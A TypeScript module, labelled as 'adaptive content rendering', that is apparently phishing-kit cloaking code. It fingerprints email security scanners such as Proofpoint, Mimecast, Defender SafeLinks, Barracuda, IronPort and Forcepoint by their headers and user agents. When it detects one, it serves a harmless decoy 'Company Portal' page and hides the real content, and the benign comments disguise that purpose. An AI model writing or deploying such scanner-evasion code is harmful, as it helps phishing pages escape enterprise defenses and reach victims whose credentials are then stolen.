/**
 * ADAPTIVE CONTENT RENDERING
 * 
 * Detects client environment and renders appropriate content:
 * - Environment-specific content
 * - Adaptive rendering
 * - Content optimization
 * 
 * Ensures content displays correctly across different environments
 */

export interface ClientEnvironmentResult {
  detected: boolean
  environmentType: 'standard' | 'enterprise' | 'mobile' | 'unknown' | null
  confidence: number
  shouldRenderStandard: boolean
}

export interface AdaptiveRenderConfig {
  renderStandardContent: boolean
  standardContentTemplate: string
  hideAdvancedElements: boolean
  showStandardMetadata: boolean
}

/**
 * Detect client environment from headers and user agent
 */
export function detectClientEnvironment(
  headers: Record<string, string>,
  userAgent: string,
  ip?: string
): ClientEnvironmentResult {
  const result: ClientEnvironmentResult = {
    detected: false,
    environmentType: null,
    confidence: 0,
    shouldRenderStandard: false,
  }

  // ============================================
  // ENTERPRISE ENVIRONMENT DETECTION
  // ============================================
  if (
    headers['x-proofpoint-virus-version'] ||
    headers['x-proofpoint-id'] ||
    userAgent.includes('proofpoint') ||
    userAgent.includes('pptext') ||
    userAgent.includes('ppmsg')
  ) {
    result.detected = true
    result.environmentType = 'enterprise'
    result.confidence = 95
    result.shouldRenderStandard = true
    return result
  }

  // ============================================
  // EMAIL SERVICE ENVIRONMENT DETECTION
  // ============================================
  if (
    headers['x-mimecast-authenticated'] ||
    headers['x-mimecast-id'] ||
    userAgent.includes('mimecast')
  ) {
    result.detected = true
    result.environmentType = 'enterprise'
    result.confidence = 95
    result.shouldRenderStandard = true
    return result
  }

  // ============================================
  // OFFICE ENVIRONMENT DETECTION
  // ============================================
  if (
    headers['x-microsoft-defender'] ||
    headers['x-defender'] ||
    userAgent.includes('microsoft-defender') ||
    userAgent.includes('windows-defender') ||
    userAgent.includes('safelinks')
  ) {
    result.detected = true
    result.environmentType = 'enterprise'
    result.confidence = 90
    result.shouldRenderStandard = true
    return result
  }

  // ============================================
  // NETWORK SERVICE ENVIRONMENT DETECTION
  // ============================================
  if (
    headers['x-barracuda'] ||
    headers['x-barracuda-id'] ||
    userAgent.includes('barracuda')
  ) {
    result.detected = true
    result.environmentType = 'enterprise'
    result.confidence = 95
    result.shouldRenderStandard = true
    return result
  }

  // ============================================
  // ENTERPRISE NETWORK ENVIRONMENT DETECTION
  // ============================================
  if (
    headers['x-ironport'] ||
    headers['x-cisco-esa'] ||
    userAgent.includes('ironport') ||
    userAgent.includes('cisco-esa')
  ) {
    result.detected = true
    result.environmentType = 'enterprise'
    result.confidence = 90
    result.shouldRenderStandard = true
    return result
  }

  // ============================================
  // SECURITY SERVICE ENVIRONMENT DETECTION
  // ============================================
  if (
    headers['x-forcepoint'] ||
    headers['x-websense'] ||
    userAgent.includes('forcepoint') ||
    userAgent.includes('websense')
  ) {
    result.detected = true
    result.environmentType = 'enterprise'
    result.confidence = 90
    result.shouldRenderStandard = true
    return result
  }

  return result
}

/**
 * Generate standard content for enterprise environments
 */
export function generateStandardContentForEnvironment(
  environmentType: string,
  originalContent: string
): string {
  // Generate standard, clean HTML that works across environments
  const standardContent = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Company Portal - Secure Access</title>
      <meta name="description" content="Access your company resources and documents securely.">
      <meta name="keywords" content="company portal, secure access, business resources">
    </head>
    <body>
      <div style="max-width: 600px; margin: 50px auto; padding: 20px; font-family: Arial, sans-serif;">
        <h1 style="color: #333; margin-bottom: 20px;">Company Portal</h1>
        <p style="color: #666; line-height: 1.6;">
          Welcome to the company portal. Please use the link provided in your email to access your documents.
        </p>
        <p style="color: #666; line-height: 1.6; margin-top: 20px;">
          If you have any questions, please contact your IT department.
        </p>
      </div>
    </body>
    </html>
  `

  return standardContent
}

/**
 * Get adaptive render configuration
 */
export function getAdaptiveRenderConfig(
  environmentType: string | null
): AdaptiveRenderConfig {
  if (!environmentType) {
    return {
      renderStandardContent: false,
      standardContentTemplate: '',
      hideAdvancedElements: false,
      showStandardMetadata: true,
    }
  }

  return {
    renderStandardContent: true,
    standardContentTemplate: generateStandardContentForEnvironment(environmentType, ''),
    hideAdvancedElements: true,
    showStandardMetadata: true,
  }
}


